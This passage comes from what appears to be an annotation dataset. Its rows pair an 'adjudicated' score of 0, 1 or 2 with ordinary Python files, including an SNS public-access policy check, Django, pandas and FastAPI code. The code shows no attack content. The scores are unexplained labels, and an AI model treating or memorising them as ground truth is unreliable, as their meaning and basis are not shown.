statement[""Principal""]<<NEWL>>                                and ""*"" in statement[""Principal""][""CanonicalUser""]<<NEWL>>                            )<<NEWL>>                        ):<<NEWL>>                            if ""Condition"" not in statement:<<NEWL>>                                report.status = ""FAIL""<<NEWL>>                                report.status_extended = (<<NEWL>>                                    f""SNS topic {topic.name} policy with public access""<<NEWL>>                                )<<NEWL>>                            else:<<NEWL>>                                report.status = ""FAIL""<<NEWL>>                                report.status_extended = f""SNS topic {topic.name} policy with public access but has a Condition""<<NEWL>><<NEWL>>            findings.append(report)<<NEWL>><<NEWL>>        return findings"
53	adjudicated	0	"import esphome.codegen as cg<<NEWL>>import esphome.config_validation as cv<<NEWL>><<NEWL>>from esphome.components import binary_sensor, display<<NEWL>>from esphome.const import CONF_PAGE_ID<<NEWL>><<NEWL>>from .. import touchscreen_ns, CONF_TOUCHSCREEN_ID, Touchscreen, TouchListener<<NEWL>><<NEWL>>DEPENDENCIES = [""touchscreen""]<<NEWL>><<NEWL>>TouchscreenBinarySensor = touchscreen_ns.class_(<<NEWL>>    ""TouchscreenBinarySensor"",<<NEWL>>    binary_sensor.BinarySensor,<<NEWL>>    cg.Component,<<NEWL>>    TouchListener,<<NEWL>>    cg.Parented.template(Touchscreen),<<NEWL>>)<<NEWL>><<NEWL>>CONF_X_MIN = ""x_min""<<NEWL>>CONF_X_MAX = ""x_max""<<NEWL>>CONF_Y_MIN = ""y_min""<<NEWL>>CONF_Y_MAX = ""y_max""<<NEWL>><<NEWL>><<NEWL>>def validate_coords(config):<<NEWL>>    if (<<NEWL>>        config[CONF_X_MAX] < config[CONF_X_MIN]<<NEWL>>        or config[CONF_Y_MAX] < config[CONF_Y_MIN]<<NEWL>>    ):<<NEWL>>        raise cv.Invalid(<<NEWL>>            f""{CONF_X_MAX} is less than {CONF_X_MIN} or {CONF_Y_MAX} is less than {CONF_Y_MIN}""<<NEWL>>        )<<NEWL>>    return config<<NEWL>><<NEWL>><<NEWL>>CONFIG_SCHEMA = cv.All(<<NEWL>>    binary_sensor.binary_sensor_schema(TouchscreenBinarySensor)<<NEWL>>    .extend(<<NEWL>>        {<<NEWL>>            cv.GenerateID(CONF_TOUCHSCREEN_ID): cv.use_id(Touchscreen),<<NEWL>>            cv.Required(CONF_X_MIN): cv.int_range(min=0, max=2000),<<NEWL>>            cv.Required(CONF_X_MAX): cv.int_range(min=0, max=2000),<<NEWL>>            cv.Required(CONF_Y_MIN): cv.int_range(min=0, max=2000),<<NEWL>>            cv.Required(CONF_Y_MAX): cv.int_range(min=0, max=2000),<<NEWL>>            cv.Optional(CONF_PAGE_ID): cv.use_id(display.DisplayPage),<<NEWL>>        }<<NEWL>>    )<<NEWL>>    .extend(cv.COMPONENT_SCHEMA),<<NEWL>>    validate_coords,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>async def to_code(config):<<NEWL>>    var = await binary_sensor.new_binary_sensor(config)<<NEWL>>    await cg.register_component(var, config)<<NEWL>>    await cg.register_parented(var, config[CONF_TOUCHSCREEN_ID])<<NEWL>><<NEWL>>    cg.add(<<NEWL>>        var.set_area(<<NEWL>>            config[CONF_X_MIN],<<NEWL>>            config[CONF_X_MAX],<<NEWL>>            config[CONF_Y_MIN],<<NEWL>>            config[CONF_Y_MAX],<<NEWL>>        )<<NEWL>>    )<<NEWL>><<NEWL>>    if CONF_PAGE_ID in config:<<NEWL>>        page = await cg.get_variable(config[CONF_PAGE_ID])<<NEWL>>        cg.add(var.set_page(page))"
282	adjudicated	0	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>from google.cloud.automl_v1beta1 import Model<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>import automl_tables_model<<NEWL>>import automl_tables_predict<<NEWL>>import model_test<<NEWL>><<NEWL>><<NEWL>>PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]<<NEWL>>REGION = ""us-central1""<<NEWL>>STATIC_MODEL = model_test.STATIC_MODEL<<NEWL>>GCS_INPUT = ""gs://{}-automl-tables-test/bank-marketing.csv"".format(PROJECT)<<NEWL>>GCS_OUTPUT = ""gs://{}-automl-tables-test/TABLE_TEST_OUTPUT/"".format(PROJECT)<<NEWL>>BQ_INPUT = ""bq://{}.automl_test.bank_marketing"".format(PROJECT)<<NEWL>>BQ_OUTPUT = ""bq://{}"".format(PROJECT)<<NEWL>>PARAMS = {}<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.slow<<NEWL>>def test_batch_predict(capsys):<<NEWL>>    ensure_model_online()<<NEWL>><<NEWL>>    automl_tables_predict.batch_predict(<<NEWL>>        PROJECT, REGION, STATIC_MODEL, GCS_INPUT, GCS_OUTPUT, PARAMS<<NEWL>>    )<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert ""Batch prediction complete"" in out<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.slow<<NEWL>>def test_batch_predict_bq(capsys):<<NEWL>>    ensure_model_online()<<NEWL>>    automl_tables_predict.batch_predict_bq(<<NEWL>>        PROJECT, REGION, STATIC_MODEL, BQ_INPUT, BQ_OUTPUT, PARAMS<<NEWL>>    )<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert ""Batch prediction complete"" in out<<NEWL>><<NEWL>><<NEWL>>def ensure_model_online():<<NEWL>>    model = model_test.ensure_model_ready()<<NEWL>>    if model.deployment_state != Model.DeploymentState.DEPLOYED:<<NEWL>>        automl_tables_model.deploy_model(PROJECT, REGION, model.display_name)<<NEWL>><<NEWL>>    return automl_tables_model.get_model(PROJECT, REGION, model.display_name)"
113	adjudicated	2	"""""""<<NEWL>>This module includes some utility functions for inspecting the layout<<NEWL>>of a GDAL data source -- the functionality is analogous to the output<<NEWL>>produced by the `ogrinfo` utility.<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib.gis.gdal import DataSource<<NEWL>>from django.contrib.gis.gdal.geometries import GEO_CLASSES<<NEWL>><<NEWL>><<NEWL>>def ogrinfo(data_source, num_features=10):<<NEWL>>    """"""<<NEWL>>    Walk the available layers in the supplied `data_source`, displaying<<NEWL>>    the fields for the first `num_features` features.<<NEWL>>    """"""<<NEWL>><<NEWL>>    # Checking the parameters.<<NEWL>>    if isinstance(data_source, str):<<NEWL>>        data_source = DataSource(data_source)<<NEWL>>    elif isinstance(data_source, DataSource):<<NEWL>>        pass<<NEWL>>    else:<<NEWL>>        raise Exception(<<NEWL>>            ""Data source parameter must be a string or a DataSource object.""<<NEWL>>        )<<NEWL>><<NEWL>>    for i, layer in enumerate(data_source):<<NEWL>>        print(""data source : %s"" % data_source.name)<<NEWL>>        print(""==== layer %s"" % i)<<NEWL>>        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)<<NEWL>>        print(""  # features: %s"" % len(layer))<<NEWL>>        print(""         srs: %s"" % layer.srs)<<NEWL>>        extent_tup = layer.extent.tuple<<NEWL>>        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))<<NEWL>>        print(""Displaying the first %s features ===="" % num_features)<<NEWL>><<NEWL>>        width = max(*map(len, layer.fields))<<NEWL>>        fmt = "" %%%ss: %%s"" % width<<NEWL>>        for j, feature in enumerate(layer[:num_features]):<<NEWL>>            print(""=== Feature %s"" % j)<<NEWL>>            for fld_name in layer.fields:<<NEWL>>                type_name = feature[fld_name].type_name<<NEWL>>                output = fmt % (fld_name, type_name)<<NEWL>>                val = feature.get(fld_name)<<NEWL>>                if val:<<NEWL>>                    if isinstance(val, str):<<NEWL>>                        val_fmt = ' (""%s"")'<<NEWL>>                    else:<<NEWL>>                        val_fmt = "" (%s)""<<NEWL>>                    output += val_fmt % val<<NEWL>>                else:<<NEWL>>                    output += "" (None)""<<NEWL>>                print(output)"
214	adjudicated	0	"import datetime<<NEWL>><<NEWL>>import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    DataFrame,<<NEWL>>    Series,<<NEWL>>    _testing as tm,<<NEWL>>)<<NEWL>>from pandas.tests.io.pytables.common import ensure_clean_store<<NEWL>><<NEWL>>pytestmark = pytest.mark.single_cpu<<NEWL>><<NEWL>><<NEWL>>def test_store_datetime_fractional_secs(setup_path):<<NEWL>><<NEWL>>    with ensure_clean_store(setup_path) as store:<<NEWL>>        dt = datetime.datetime(2012, 1, 2, 3, 4, 5, 123456)<<NEWL>>        series = Series([0], [dt])<<NEWL>>        store[""a""] = series<<NEWL>>        assert store[""a""].index[0] == dt<<NEWL>><<NEWL>><<NEWL>>def test_tseries_indices_series(setup_path):<<NEWL>><<NEWL>>    with ensure_clean_store(setup_path) as store:<<NEWL>>        idx = tm.makeDateIndex(10)<<NEWL>>        ser = Series(np.random.randn(len(idx)), idx)<<NEWL>>        store[""a""] = ser<<NEWL>>        result = store[""a""]<<NEWL>><<NEWL>>        tm.assert_series_equal(result, ser)<<NEWL>>        assert result.index.freq == ser.index.freq<<NEWL>>        tm.assert_class_equal(result.index, ser.index, obj=""series index"")<<NEWL>><<NEWL>>        idx = tm.makePeriodIndex(10)<<NEWL>>        ser = Series(np.random.randn(len(idx)), idx)<<NEWL>>        store[""a""] = ser<<NEWL>>        result = store[""a""]<<NEWL>><<NEWL>>        tm.assert_series_equal(result, ser)<<NEWL>>        assert result.index.freq == ser.index.freq<<NEWL>>        tm.assert_class_equal(result.index, ser.index, obj=""series index"")<<NEWL>><<NEWL>><<NEWL>>def test_tseries_indices_frame(setup_path):<<NEWL>><<NEWL>>    with ensure_clean_store(setup_path) as store:<<NEWL>>        idx = tm.makeDateIndex(10)<<NEWL>>        df = DataFrame(np.random.randn(len(idx), 3), index=idx)<<NEWL>>        store[""a""] = df<<NEWL>>        result = store[""a""]<<NEWL>><<NEWL>>        tm.assert_frame_equal(result, df)<<NEWL>>        assert result.index.freq == df.index.freq<<NEWL>>        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")<<NEWL>><<NEWL>>        idx = tm.makePeriodIndex(10)<<NEWL>>        df = DataFrame(np.random.randn(len(idx), 3), idx)<<NEWL>>        store[""a""] = df<<NEWL>>        result = store[""a""]<<NEWL>><<NEWL>>        tm.assert_frame_equal(result, df)<<NEWL>>        assert result.index.freq == df.index.freq<<NEWL>>        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")"
185	adjudicated	0	"#!/usr/bin/python3<<NEWL>># -*- coding: utf-8 -*-<<NEWL>>#<<NEWL>>#    Copyright (C) 2022 by YOUR NAME HERE<<NEWL>>#<<NEWL>>#    This file is part of RoboComp<<NEWL>>#<<NEWL>>#    RoboComp is free software: you can redistribute it and/or modify<<NEWL>>#    it under the terms of the GNU General Public License as published by<<NEWL>>#    the Free Software Foundation, either version 3 of the License, or<<NEWL>>#    (at your option) any later version.<<NEWL>>#<<NEWL>>#    RoboComp is distributed in the hope that it will be useful,<<NEWL>>#    but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>>#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the<<NEWL>>#    GNU General Public License for more details.<<NEWL>>#<<NEWL>>#    You should have received a copy of the GNU General Public License<<NEWL>>#    along with RoboComp.  If not, see <http://www.gnu.org/licenses/>.<<NEWL>><<NEWL>>import sys, Ice, os<<NEWL>>from PySide2 import QtWidgets, QtCore<<NEWL>><<NEWL>>ROBOCOMP = ''<<NEWL>>try:<<NEWL>>    ROBOCOMP = os.environ['ROBOCOMP']<<NEWL>>except KeyError:<<NEWL>>    print('$ROBOCOMP environment variable not set, using the default value /opt/robocomp')<<NEWL>>    ROBOCOMP = '/opt/robocomp'<<NEWL>><<NEWL>>Ice.loadSlice(""-I ./src/ --all ./src/CommonBehavior.ice"")<<NEWL>>import RoboCompCommonBehavior<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>class GenericWorker(QtCore.QObject):<<NEWL>><<NEWL>>    kill = QtCore.Signal()<<NEWL>><<NEWL>>    def __init__(self, mprx):<<NEWL>>        super(GenericWorker, self).__init__()<<NEWL>><<NEWL>>        self.people_proxy = mprx[""PeopleProxy""]<<NEWL>>        self.people1_proxy = mprx[""PeopleProxy1""]<<NEWL>>        self.peoplepub_proxy = mprx[""PeoplePub""]<<NEWL>><<NEWL>>        self.mutex = QtCore.QMutex(QtCore.QMutex.Recursive)<<NEWL>>        self.Period = 30<<NEWL>>        self.timer = QtCore.QTimer(self)<<NEWL>><<NEWL>><<NEWL>>    @QtCore.Slot()<<NEWL>>    def killYourSelf(self):<<NEWL>>        rDebug(""Killing myself"")<<NEWL>>        self.kill.emit()<<NEWL>><<NEWL>>    # \brief Change compute period<<NEWL>>    # @param per Period in ms<<NEWL>>    @QtCore.Slot(int)<<NEWL>>    def setPeriod(self, p):<<NEWL>>        print(""Period changed"", p)<<NEWL>>        self.Period = p<<NEWL>>        self.timer.start(self.Period)"
354	adjudicated	1	"import builtins<<NEWL>>import logging<<NEWL>>import signal<<NEWL>>import threading<<NEWL>>import traceback<<NEWL>>import warnings<<NEWL>><<NEWL>>import trio<<NEWL>><<NEWL>><<NEWL>>class TrioRunner:<<NEWL>>    def __init__(self):<<NEWL>>        self._cell_cancel_scope = None<<NEWL>>        self._trio_token = None<<NEWL>><<NEWL>>    def initialize(self, kernel, io_loop):<<NEWL>>        kernel.shell.set_trio_runner(self)<<NEWL>>        kernel.shell.run_line_magic(""autoawait"", ""trio"")<<NEWL>>        kernel.shell.magics_manager.magics[""line""][""autoawait""] = lambda _: warnings.warn(<<NEWL>>            ""Autoawait isn't allowed in Trio background loop mode.""<<NEWL>>        )<<NEWL>>        bg_thread = threading.Thread(target=io_loop.start, daemon=True, name=""TornadoBackground"")<<NEWL>>        bg_thread.start()<<NEWL>><<NEWL>>    def interrupt(self, signum, frame):<<NEWL>>        if self._cell_cancel_scope:<<NEWL>>            self._cell_cancel_scope.cancel()<<NEWL>>        else:<<NEWL>>            raise Exception(""Kernel interrupted but no cell is running"")<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        old_sig = signal.signal(signal.SIGINT, self.interrupt)<<NEWL>><<NEWL>>        def log_nursery_exc(exc):<<NEWL>>            exc = ""\n"".join(traceback.format_exception(type(exc), exc, exc.__traceback__))<<NEWL>>            logging.error(""An exception occurred in a global nursery task.\n%s"", exc)<<NEWL>><<NEWL>>        async def trio_main():<<NEWL>>            self._trio_token = trio.lowlevel.current_trio_token()<<NEWL>>            async with trio.open_nursery() as nursery:<<NEWL>>                # TODO This hack prevents the nursery from cancelling all child<<NEWL>>                # tasks when an uncaught exception occurs, but it's ugly.<<NEWL>>                nursery._add_exc = log_nursery_exc<<NEWL>>                builtins.GLOBAL_NURSERY = nursery  # type:ignore[attr-defined]<<NEWL>>                await trio.sleep_forever()<<NEWL>><<NEWL>>        trio.run(trio_main)<<NEWL>>        signal.signal(signal.SIGINT, old_sig)<<NEWL>><<NEWL>>    def __call__(self, async_fn):<<NEWL>>        async def loc(coro):<<NEWL>>            self._cell_cancel_scope = trio.CancelScope()<<NEWL>>            with self._cell_cancel_scope:<<NEWL>>                return await coro<<NEWL>>            self._cell_cancel_scope = None<<NEWL>><<NEWL>>        return trio.from_thread.run(loc, async_fn, trio_token=self._trio_token)"
245	adjudicated	0	"from .models import OrderedDrug, Order<<NEWL>>from django.dispatch import receiver<<NEWL>>from django.db.models.signals import post_save, post_delete<<NEWL>>from notifications_app.tasks import create_notification, delete_notifications<<NEWL>>from django.db.transaction import on_commit<<NEWL>>from .tasks import set_drug_quantity<<NEWL>>from django.contrib.auth import get_user_model<<NEWL>><<NEWL>>User = get_user_model()<<NEWL>><<NEWL>><<NEWL>>@receiver(post_save, sender=OrderedDrug)<<NEWL>>def reduce_drug_quantity(instance, **kwargs):<<NEWL>>    on_commit(lambda: set_drug_quantity.delay(instance.drug.id, -instance.quantity))<<NEWL>><<NEWL>><<NEWL>>@receiver(post_delete, sender=OrderedDrug)<<NEWL>>def rollback_drug_quantity(instance, **kwargs):<<NEWL>>    on_commit(lambda: set_drug_quantity.delay(instance.drug.id, instance.quantity))<<NEWL>><<NEWL>><<NEWL>>@receiver(post_save, sender=Order)<<NEWL>>def send_creation_notif(instance, created, **kwargs):<<NEWL>>    if created:<<NEWL>>        admin = User.objects.get(is_staff=1)<<NEWL>>        data = {<<NEWL>>            ""sender_id"": instance.user.id,<<NEWL>>            ""receiver_id"": admin.id,<<NEWL>>            ""options"": {<<NEWL>>                ""message"": f""the user {instance.user.full_name} asks order"",<<NEWL>>                ""order_id"": instance.id,<<NEWL>>            },<<NEWL>>        }<<NEWL>>        on_commit(lambda: create_notification.delay(**data))<<NEWL>><<NEWL>><<NEWL>>@receiver(post_save, sender=Order)<<NEWL>>def send_approving_notif(instance, **kwargs):<<NEWL>>    if instance.status == ""Completed"":<<NEWL>>        admin = User.objects.get(is_staff=1)<<NEWL>>        data = {<<NEWL>>            ""sender_id"": admin.id,<<NEWL>>            ""receiver_id"": instance.user.id,<<NEWL>>            ""options"": {<<NEWL>>                ""message"": f""the admin approve your order order"",<<NEWL>>                ""order_id"": instance.id,<<NEWL>>            },<<NEWL>>        }<<NEWL>>        on_commit(lambda: create_notification.delay(**data))<<NEWL>><<NEWL>><<NEWL>>@receiver(post_delete, sender=Order)<<NEWL>>def send_notification(instance, **kwargs):<<NEWL>>    on_commit(lambda: delete_notifications.delay(instance.id, ""order_id""))"
94	adjudicated	2	"from django.conf import settings<<NEWL>>from django.utils.translation import get_supported_language_variant<<NEWL>>from django.utils.translation.trans_real import language_code_re<<NEWL>><<NEWL>>from . import Error, Tags, register<<NEWL>><<NEWL>>E001 = Error(<<NEWL>>    ""You have provided an invalid value for the LANGUAGE_CODE setting: {!r}."",<<NEWL>>    id=""translation.E001"",<<NEWL>>)<<NEWL>><<NEWL>>E002 = Error(<<NEWL>>    ""You have provided an invalid language code in the LANGUAGES setting: {!r}."",<<NEWL>>    id=""translation.E002"",<<NEWL>>)<<NEWL>><<NEWL>>E003 = Error(<<NEWL>>    ""You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}."",<<NEWL>>    id=""translation.E003"",<<NEWL>>)<<NEWL>><<NEWL>>E004 = Error(<<NEWL>>    ""You have provided a value for the LANGUAGE_CODE setting that is not in ""<<NEWL>>    ""the LANGUAGES setting."",<<NEWL>>    id=""translation.E004"",<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_language_code(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGE_CODE setting is invalid.""""""<<NEWL>>    tag = settings.LANGUAGE_CODE<<NEWL>>    if not isinstance(tag, str) or not language_code_re.match(tag):<<NEWL>>        return [Error(E001.msg.format(tag), id=E001.id)]<<NEWL>>    return []<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E002.msg.format(tag), id=E002.id)<<NEWL>>        for tag, _ in settings.LANGUAGES<<NEWL>>        if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages_bidi(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES_BIDI setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E003.msg.format(tag), id=E003.id)<<NEWL>>        for tag in settings.LANGUAGES_BIDI<<NEWL>>        if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_language_settings_consistent(app_configs, **kwargs):<<NEWL>>    """"""Error if language settings are not consistent with each other.""""""<<NEWL>>    try:<<NEWL>>        get_supported_language_variant(settings.LANGUAGE_CODE)<<NEWL>>    except LookupError:<<NEWL>>        return [E004]<<NEWL>>    else:<<NEWL>>        return []"
127	adjudicated	2	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>>from __future__ import absolute_import, division, print_function<<NEWL>><<NEWL>><<NEWL>>class InfinityType(object):<<NEWL>>    def __repr__(self):<<NEWL>>        # type: () -> str<<NEWL>>        return ""Infinity""<<NEWL>><<NEWL>>    def __hash__(self):<<NEWL>>        # type: () -> int<<NEWL>>        return hash(repr(self))<<NEWL>><<NEWL>>    def __lt__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return False<<NEWL>><<NEWL>>    def __le__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return False<<NEWL>><<NEWL>>    def __eq__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return isinstance(other, self.__class__)<<NEWL>><<NEWL>>    def __ne__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return not isinstance(other, self.__class__)<<NEWL>><<NEWL>>    def __gt__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return True<<NEWL>><<NEWL>>    def __ge__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return True<<NEWL>><<NEWL>>    def __neg__(self):<<NEWL>>        # type: (object) -> NegativeInfinityType<<NEWL>>        return NegativeInfinity<<NEWL>><<NEWL>><<NEWL>>Infinity = InfinityType()<<NEWL>><<NEWL>><<NEWL>>class NegativeInfinityType(object):<<NEWL>>    def __repr__(self):<<NEWL>>        # type: () -> str<<NEWL>>        return ""-Infinity""<<NEWL>><<NEWL>>    def __hash__(self):<<NEWL>>        # type: () -> int<<NEWL>>        return hash(repr(self))<<NEWL>><<NEWL>>    def __lt__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return True<<NEWL>><<NEWL>>    def __le__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return True<<NEWL>><<NEWL>>    def __eq__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return isinstance(other, self.__class__)<<NEWL>><<NEWL>>    def __ne__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return not isinstance(other, self.__class__)<<NEWL>><<NEWL>>    def __gt__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return False<<NEWL>><<NEWL>>    def __ge__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return False<<NEWL>><<NEWL>>    def __neg__(self):<<NEWL>>        # type: (object) -> InfinityType<<NEWL>>        return Infinity<<NEWL>><<NEWL>><<NEWL>>NegativeInfinity = NegativeInfinityType()"
67	adjudicated	1	# Generated by Django 4.1.5 on 2023-03-07 04:49<<NEWL>><<NEWL>>from django.db import migrations, models<<NEWL>><<NEWL>><<NEWL>>class Migration(migrations.Migration):<<NEWL>><<NEWL>>    dependencies = [<<NEWL>>        ('rto', '0001_initial'),<<NEWL>>    ]<<NEWL>><<NEWL>>    operations = [<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Rules',<<NEWL>>            fields=[<<NEWL>>                ('rule_id', models.AutoField(primary_key=True, serialize=False)),<<NEWL>>                ('rule_code', models.CharField(max_length=50)),<<NEWL>>                ('rule_desc', models.CharField(blank=True, max_length=100)),<<NEWL>>                ('rule_sect', models.CharField(max_length=50, null=True)),<<NEWL>>                ('rule_pen', models.CharField(max_length=100, null=True)),<<NEWL>>            ],<<NEWL>>        ),<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Vehicle',<<NEWL>>            fields=[<<NEWL>>                ('vehicle_id', models.AutoField(primary_key=True, serialize=False)),<<NEWL>>                ('vehicle_no', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_own_name', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_own_contact', models.IntegerField(default=None)),<<NEWL>>                ('vehicle_own_add', models.CharField(default=None, max_length=100)),<<NEWL>>                ('vehicle_own_email', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_company_name', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_date_reg', models.DateField(default=None)),<<NEWL>>                ('vehicle_chassics_no', models.CharField(default=None, max_length=30)),<<NEWL>>                ('vehicle_eng_no', models.CharField(default=None, max_length=30)),<<NEWL>>                ('vehicle_own_srno', models.IntegerField(default=None)),<<NEWL>>                ('vehicle_fuel_use', models.CharField(default=None, max_length=30)),<<NEWL>>                ('vehicle_Seat_cap', models.IntegerField(default=None)),<<NEWL>>                ('vehicle_model_name', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_created_date', models.DateField(auto_now_add=True)),<<NEWL>>                ('vehicle_last_login', models.CharField(default=None, max_length=30)),<<NEWL>>            ],<<NEWL>>        ),<<NEWL>>    ]
176	adjudicated	2	"import pytest<<NEWL>><<NEWL>>from pandas import TimedeltaIndex<<NEWL>><<NEWL>>from pandas.tseries.offsets import (<<NEWL>>    DateOffset,<<NEWL>>    Day,<<NEWL>>    Hour,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class TestFreq:<<NEWL>>    @pytest.mark.parametrize(""values"", [[""0 days"", ""2 days"", ""4 days""], []])<<NEWL>>    @pytest.mark.parametrize(""freq"", [""2D"", Day(2), ""48H"", Hour(48)])<<NEWL>>    def test_freq_setter(self, values, freq):<<NEWL>>        # GH#20678<<NEWL>>        idx = TimedeltaIndex(values)<<NEWL>><<NEWL>>        # can set to an offset, converting from string if necessary<<NEWL>>        idx._data.freq = freq<<NEWL>>        assert idx.freq == freq<<NEWL>>        assert isinstance(idx.freq, DateOffset)<<NEWL>><<NEWL>>        # can reset to None<<NEWL>>        idx._data.freq = None<<NEWL>>        assert idx.freq is None<<NEWL>><<NEWL>>    def test_freq_setter_errors(self):<<NEWL>>        # GH#20678<<NEWL>>        idx = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""])<<NEWL>><<NEWL>>        # setting with an incompatible freq<<NEWL>>        msg = (<<NEWL>>            ""Inferred frequency 2D from passed values does not conform to ""<<NEWL>>            ""passed frequency 5D""<<NEWL>>        )<<NEWL>>        with pytest.raises(ValueError, match=msg):<<NEWL>>            idx._data.freq = ""5D""<<NEWL>><<NEWL>>        # setting with a non-fixed frequency<<NEWL>>        msg = r""<2 \* BusinessDays> is a non-fixed frequency""<<NEWL>>        with pytest.raises(ValueError, match=msg):<<NEWL>>            idx._data.freq = ""2B""<<NEWL>><<NEWL>>        # setting with non-freq string<<NEWL>>        with pytest.raises(ValueError, match=""Invalid frequency""):<<NEWL>>            idx._data.freq = ""foo""<<NEWL>><<NEWL>>    def test_freq_view_safe(self):<<NEWL>>        # Setting the freq for one TimedeltaIndex shouldn't alter the freq<<NEWL>>        #  for another that views the same data<<NEWL>><<NEWL>>        tdi = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""], freq=""2D"")<<NEWL>>        tda = tdi._data<<NEWL>><<NEWL>>        tdi2 = TimedeltaIndex(tda)._with_freq(None)<<NEWL>>        assert tdi2.freq is None<<NEWL>><<NEWL>>        # Original was not altered<<NEWL>>        assert tdi.freq == ""2D""<<NEWL>>        assert tda.freq == ""2D"""
26	adjudicated	0	from typing import Optional<<NEWL>><<NEWL>>from fastapi import Depends, HTTPException, Path, Query<<NEWL>>from starlette import status<<NEWL>><<NEWL>>from app.api.dependencies.authentication import get_current_user_authorizer<<NEWL>>from app.api.dependencies.database import get_repository<<NEWL>>from app.db.errors import EntityDoesNotExist<<NEWL>>from app.db.repositories.items import ItemsRepository<<NEWL>>from app.models.domain.items import Item<<NEWL>>from app.models.domain.users import User<<NEWL>>from app.models.schemas.items import (<<NEWL>>    DEFAULT_ITEMS_LIMIT,<<NEWL>>    DEFAULT_ITEMS_OFFSET,<<NEWL>>    ItemsFilters,<<NEWL>>)<<NEWL>>from app.resources import strings<<NEWL>>from app.services.items import check_user_can_modify_item<<NEWL>><<NEWL>><<NEWL>>def get_items_filters(<<NEWL>>    tag: Optional[str] = None,<<NEWL>>    seller: Optional[str] = None,<<NEWL>>    favorited: Optional[str] = None,<<NEWL>>    limit: int = Query(DEFAULT_ITEMS_LIMIT, ge=1),<<NEWL>>    offset: int = Query(DEFAULT_ITEMS_OFFSET, ge=0),<<NEWL>>) -> ItemsFilters:<<NEWL>>    return ItemsFilters(<<NEWL>>        tag=tag,<<NEWL>>        seller=seller,<<NEWL>>        favorited=favorited,<<NEWL>>        limit=limit,<<NEWL>>        offset=offset,<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>async def get_item_by_slug_from_path(<<NEWL>>    slug: str = Path(..., min_length=1),<<NEWL>>    user: Optional[User] = Depends(get_current_user_authorizer(required=False)),<<NEWL>>    items_repo: ItemsRepository = Depends(get_repository(ItemsRepository)),<<NEWL>>) -> Item:<<NEWL>>    try:<<NEWL>>        return await items_repo.get_item_by_slug(slug=slug, requested_user=user)<<NEWL>>    except EntityDoesNotExist:<<NEWL>>        raise HTTPException(<<NEWL>>            status_code=status.HTTP_404_NOT_FOUND,<<NEWL>>            detail=strings.ITEM_DOES_NOT_EXIST_ERROR,<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>def check_item_modification_permissions(<<NEWL>>    current_item: Item = Depends(get_item_by_slug_from_path),<<NEWL>>    user: User = 